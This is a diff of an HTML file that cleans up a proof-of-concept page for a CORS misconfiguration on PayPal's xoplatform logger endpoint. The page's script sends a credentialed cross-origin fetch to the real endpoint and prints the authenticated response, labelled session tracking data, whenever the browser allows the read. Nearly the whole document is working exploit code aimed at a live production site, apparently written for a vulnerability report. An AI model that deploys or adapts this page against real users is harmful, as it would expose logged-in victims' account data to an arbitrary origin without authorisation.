@@ -1,73 +1,72 @@
 <!DOCTYPE html>
-       2 <html>
-       3 <head>
-       4 <title>CORS PoC - PayPal xoplatform logger</title>
-       5 <style>
-       6 body { font-family: monospace; padding: 20px; background: #1a1a1a; color: #ccc; }
-       7 h1 { color: #fff; font-size: 16px; }
-       8 pre { background: #111; padding: 15px; border: 1px solid #333; overflow-x: auto; white-space: pre-wrap; word-break: break-all; }
-       9 .success { color: #4caf50; }
-      10 .error { color: #f44336; }
-      11 .info { color: #2196f3; }
-      12 button { background: #333; color: #fff; border: 1px solid #555; padding: 8px 16px; cursor: pointer; font-family: monospace; margin
-         : 5px 0; }
-      13 button:hover { background: #444; }
-      14 </style>
-      15 </head>
-      16 <body>
-      17 <h1>CORS PoC: www.paypal.com /xoplatform/logger/api/logger</h1>
-      18 <p class="info">This page demonstrates that an arbitrary origin can read authenticated responses from PayPal's xoplatform logger e
-         ndpoint cross-origin.</p>
-      19 <p>Prerequisite: Be logged into <a href="https://www.paypal.com" style="color:#2196f3">www.paypal.com</a> in this browser.</p>
-      20 <button onclick="runPoC()">Run PoC</button>
-      21 <h2 style="font-size:14px; margin-top:20px;">Result:</h2>
-      22 <pre id="output">Click "Run PoC" to start...</pre>
-      23
-      24 <script>
-      25 function runPoC() {
-      26   var output = document.getElementById('output');
-      27   output.textContent = 'Sending credentialed cross-origin request to www.paypal.com...\n\n';
-      28
-      29   fetch('https://www.paypal.com/xoplatform/logger/api/logger', {
-      30     method: 'GET',
-      31     credentials: 'include',
-      32     headers: {
-      33       'Accept': 'application/json'
-      34     }
-      35   })
-      36   .then(function(response) {
-      37     output.textContent += 'HTTP Status: ' + response.status + '\n';
-      38     output.textContent += 'Content-Type: ' + response.headers.get('content-type') + '\n\n';
-      39
-      40     if (!response.ok) {
-      41       output.textContent += '[ERROR] Non-200 response. CORS may be blocked by WAF.\n';
-      42       output.textContent += 'Status: ' + response.status + ' ' + response.statusText + '\n';
-      43       return null;
-      44     }
-      45     return response.text();
-      46   })
-      47   .then(function(body) {
-      48     if (body === null) return;
-      49
-      50     output.textContent += '[SUCCESS] Cross-origin response readable!\n\n';
-      51     output.textContent += 'Origin of this page: ' + window.location.origin + '\n';
-      52     output.textContent += 'Target: https://www.paypal.com/xoplatform/logger/api/logger\n\n';
-      53     output.textContent += '--- Response Body (session tracking data) ---\n\n';
-      54
-      55     try {
-      56       var parsed = JSON.parse(body);
-      57       output.textContent += JSON.stringify(parsed, null, 2);
-      58     } catch (e) {
-      59       output.textContent += body;
-      60     }
-      61   })
-      62   .catch(function(err) {
-      63     output.textContent += '[BLOCKED] ' + err.message + '\n\n';
-      64     output.textContent += 'The browser blocked reading the response.\n';
-      65     output.textContent += 'This means CORS headers were not present on the actual response,\n';
-      66     output.textContent += 'likely due to WAF intervention (not the application itself).\n';
-      67   });
-      68 }
-      69 </script>
-      70 </body>
-      71 </html>
+<html><head>
+<title>CORS PoC - PayPal xoplatform logger</title>
+<style>
+body { font-family: monospace; padding: 20px; background: #1a1a1a; color: #ccc; }
+h1 { color: #fff; font-size: 16px; }
+pre { background: #111; padding: 15px; border: 1px solid #333; overflow-x: auto; white-space: pre-wrap; word-break: break-all; }
+.success { color: #4caf50; }
+.error { color: #f44336; }
+.info { color: #2196f3; }
+button { background: #333; color: #fff; border: 1px solid #555; padding: 8px 16px; cursor: pointer; font-family: monospace; margin: 5px 0; }
+button:hover { background: #444; }
+</style>
+</head>
+<body>
+<h1>CORS PoC: www.paypal.com /xoplatform/logger/api/logger</h1>
+<p class="info">This page demonstrates that an arbitrary origin can read authenticated responses from PayPal's xoplatform logger endpoint cross-origin.</p>
+<p>Prerequisite: Be logged into <a href="https://www.paypal.com" style="color:#2196f3">www.paypal.com</a> in this browser.</p>
+<button onclick="runPoC()">Run PoC</button>
+<h2 style="font-size:14px; margin-top:20px;">Result:</h2>
+<pre id="output">Click "Run PoC" to start...</pre>
+
+<script>
+function runPoC() {
+  var output = document.getElementById('output');
+  output.textContent = 'Sending credentialed cross-origin request to www.paypal.com...\n\n';
+
+  fetch('https://www.paypal.com/xoplatform/logger/api/logger', {
+    method: 'GET',
+    credentials: 'include',
+    headers: {
+      'Accept': 'application/json'
+    }
+  })
+  .then(function(response) {
+    output.textContent += 'HTTP Status: ' + response.status + '\n';
+    output.textContent += 'Content-Type: ' + response.headers.get('content-type') + '\n\n';
+
+    if (!response.ok) {
+      output.textContent += '[ERROR] Non-200 response. CORS may be blocked by WAF.\n';
+      output.textContent += 'Status: ' + response.status + ' ' + response.statusText + '\n';
+      return null;
+    }
+    return response.text();
+  })
+  .then(function(body) {
+    if (body === null) return;
+
+    output.textContent += '[SUCCESS] Cross-origin response readable!\n\n';
+    output.textContent += 'Origin of this page: ' + window.location.origin + '\n';
+    output.textContent += 'Target: https://www.paypal.com/xoplatform/logger/api/logger\n\n';
+    output.textContent += '--- Response Body (session tracking data) ---\n\n';
+
+    try {
+      var parsed = JSON.parse(body);
+      output.textContent += JSON.stringify(parsed, null, 2);
+    } catch (e) {
+      output.textContent += body;
+    }
+  })
+  .catch(function(err) {
+    output.textContent += '[BLOCKED] ' + err.message + '\n\n';
+    output.textContent += 'The browser blocked reading the response.\n';
+    output.textContent += 'This means CORS headers were not present on the actual response,\n';
+    output.textContent += 'likely due to WAF intervention (not the application itself).\n';
+  });
+}
+</script>
+
+
+</body></html>
+      
